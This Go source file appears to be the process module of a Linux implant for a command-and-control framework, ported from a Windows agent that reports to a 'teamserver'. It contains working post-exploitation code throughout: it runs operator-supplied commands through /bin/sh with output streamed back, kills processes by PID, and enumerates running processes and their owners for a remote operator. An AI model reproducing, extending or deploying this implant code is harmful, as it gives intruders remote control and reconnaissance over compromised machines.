package main

import (
	"bufio"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
)

// PROC 模块：shell（Proc::Create）、proc list、proc kill。
// Windows 特有的 modules/grep/memory/inject 在 Linux 上不适用，会回显错误。

type procEntry struct {
	name    string
	pid     int
	ppid    int
	threads int
	user    string
}

func handleProc(p *parser, req uint32) {
	sub := p.i32()
	switch sub {
	case procCreate:
		state := p.i32()
		prog := p.wstr()
		args := p.wstr()
		piped := p.boolean()
		verbose := p.boolean()
		startProcess(req, int(state), prog, args, piped, verbose)
	case procKill:
		pid := int(p.i32())
		err := syscall.Kill(pid, syscall.SIGKILL)
		out := newPacker()
		out.i32(procKill)
		out.boolean(err == nil)
		out.i32(int32(pid))
		enqueue(cmdProc, req, out.b)
	case procBlock:
		state := p.i32()
		out := newPacker()
		out.i32(procBlock)
		out.i32(state)
		enqueue(cmdProc, req, out.b)
		sendOutput(req, "blockdll is a Windows-only option (ignored on Linux)")
	case procGrep:
		name := strings.ToLower(p.wstr())
		var matched []procEntry
		for _, e := range listProcesses() {
			if name == "" || strings.Contains(strings.ToLower(e.name), name) {
				matched = append(matched, e)
			}
		}
		out := newPacker()
		out.i32(procGrep)
		for _, e := range matched {
			out.wstr(e.name)
			out.i32(int32(e.pid))
			out.i32(int32(e.ppid))
			out.wstr(e.user)
			out.i32(int32(inst.procArch))
		}
		enqueue(cmdProc, req, out.b)
	case procMemory:
		sendError(req, "proc::memory is not supported on Linux")
	default:
		sendError(req, "proc: unsupported subcommand "+itoa(int(sub))+" on Linux")
	}
}

// startProcess 同时承担 shell 与 proc create：统一用 /bin/sh -c 执行。
func startProcess(req uint32, state int, prog, args string, piped, verbose bool) {
	prog = strings.TrimRight(prog, "\x00")
	args = strings.TrimRight(args, "\x00")

	// Windows 客户端会把 cmd.exe 写成 c:\windows\system32\cmd.exe，
	// 在 Linux 上统一按 / 处理，才能正确识别出 shell。
	name := filepath.Base(strings.ReplaceAll(prog, "\\", "/"))
	shellLike := prog == "" || name == "sh" || name == "bash" || name == "cmd.exe" || name == "cmd" || name == "powershell.exe"

	var cmd *exec.Cmd
	switch {
	case shellLike:
		command := args
		if strings.HasPrefix(command, "-c ") {
			command = strings.TrimPrefix(command, "-c ")
		} else if strings.HasPrefix(command, "/c ") {
			command = strings.TrimPrefix(command, "/c ")
		}
		if strings.TrimSpace(command) == "" {
			command = "id"
		}
		cmd = exec.Command("/bin/sh", "-c", command)
	case args != "":
		cmd = exec.Command("/bin/sh", "-c", prog+" "+args)
	default:
		cmd = exec.Command(prog)
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendCreateResult(req, prog, 0, false, piped, verbose)
		sendError(req, "shell: "+err.Error())
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		sendCreateResult(req, prog, 0, false, piped, verbose)
		sendError(req, "shell: "+err.Error())
		return
	}

	if err := cmd.Start(); err != nil {
		sendCreateResult(req, prog, 0, false, piped, verbose)
		sendError(req, "shell: "+err.Error())
		return
	}

	pid := cmd.Process.Pid
	sendCreateResult(req, prog, pid, true, piped, verbose)

	if !piped {
		go func() { _ = cmd.Wait() }()
		return
	}

	go func() {
		var wg sync.WaitGroup
		emit := func(r io.Reader) {
			defer wg.Done()
			reader := bufio.NewReaderSize(r, 64*1024)
			for {
				line, err := reader.ReadString('\n')
				if len(line) > 0 {
					sendOutput(req, line)
				}
				if err != nil {
					return
				}
			}
		}
		wg.Add(2)
		go emit(stdout)
		go emit(stderr)
		wg.Wait()
		_ = cmd.Wait()
	}()
}

func sendCreateResult(req uint32, path string, pid int, success, piped, verbose bool) {
	out := newPacker()
	out.i32(procCreate)
	out.wstr(path)
	out.i32(int32(pid))
	out.boolean(success)
	out.boolean(piped)
	out.boolean(verbose)
	enqueue(cmdProc, req, out.b)
}

// ---------------------------------------------------------------------------
// process list
// ---------------------------------------------------------------------------

func handleProcList(p *parser, req uint32) {
	processUI := p.boolean()
	entries := listProcesses()

	out := newPacker()
	if processUI {
		out.i32(1)
	} else {
		out.i32(0)
	}
	for _, e := range entries {
		out.wstr(e.name)
		out.i32(int32(e.pid))
		out.i32(0) // IsWow -> teamserver 显示 x64
		out.i32(int32(e.ppid))
		out.i32(0) // Session
		out.i32(int32(e.threads))
		out.wstr(e.user)
	}
	enqueue(cmdProcList, req, out.b)
}

func listProcesses() []procEntry {
	dirs, err := os.ReadDir("/proc")
	if err != nil {
		return nil
	}
	var entries []procEntry
	for _, d := range dirs {
		if !d.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(d.Name())
		if err != nil {
			continue
		}
		e, ok := readProc(pid)
		if ok {
			entries = append(entries, e)
		}
	}
	return entries
}

var userCache = struct {
	sync.Mutex
	m map[string]string
}{m: map[string]string{}}

func lookupUser(uid string) string {
	userCache.Lock()
	defer userCache.Unlock()
	if name, ok := userCache.m[uid]; ok {
		return name
	}
	name := uid
	if u, err := user.LookupId(uid); err == nil && u.Username != "" {
		name = u.Username
	}
	userCache.m[uid] = name
	return name
}

func readProc(pid int) (procEntry, bool) {
	e := procEntry{pid: pid}
	base := "/proc/" + strconv.Itoa(pid)

	stat, err := os.ReadFile(base + "/stat")
	if err != nil {
		return e, false
	}
	s := string(stat)
	open := strings.Index(s, "(")
	close := strings.LastIndex(s, ")")
	if open < 0 || close <= open {
		return e, false
	}
	e.name = s[open+1 : close]
	rest := strings.Fields(s[close+1:])
	if len(rest) >= 2 {
		if ppid, err := strconv.Atoi(rest[1]); err == nil {
			e.ppid = ppid
		}
	}

	status, err := os.ReadFile(base + "/status")
	if err == nil {
		for _, line := range strings.Split(string(status), "\n") {
			switch {
			case strings.HasPrefix(line, "Uid:"):
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					e.user = lookupUser(fields[1])
				}
			case strings.HasPrefix(line, "Threads:"):
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					e.threads, _ = strconv.Atoi(fields[1])
				}
			}
		}
	}
	if e.threads == 0 {
		e.threads = 1
	}
	return e, true
}
